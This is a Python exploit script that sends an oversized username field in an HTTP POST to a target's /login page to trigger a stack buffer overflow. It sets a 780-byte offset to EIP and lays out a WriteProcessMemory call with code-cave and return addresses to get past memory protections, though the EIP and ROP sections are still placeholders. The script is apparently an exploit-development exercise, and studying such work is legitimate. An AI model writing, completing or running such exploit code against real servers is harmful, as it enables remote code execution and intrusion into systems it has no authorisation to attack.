#!/usr/bin/python
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 1500

  wpm = b"\x45\x45\x45\x45"         # WriteProcessMemory Address
  wpm += b"\xe0\x7d\x16\x10"        # Shellcode return address (0x10167de0)
  wpm += b"\xff\xff\xff\xff"        # pseudo Process handle (-1)
  wpm += b"\xe0\x7d\x16\x10"        # Code cave address (0x10167de0)
  wpm += b"\x46\x46\x46\x46"        # dummy lpBuffer
  wpm += b"\x47\x47\x47\x47"        # dummy nSize
  wpm += b"\x44\xc0\x20\x10"        # lpNumberOfBytesWritten (0x1020c044)

  filler = b"A" * (780 - len(wpm))  # Offset to EIP
  eip = b"B" * 4                    # EIP overwrite
  offset = b"C" * 4                 # Padding for ESP alignment 
  rop = b"D" * (size - len(filler) - len(wpm) - len(eip) - len(offset)) 
  inputBuffer = filler + wpm + eip + offset + rop
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://192.168.100.127/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
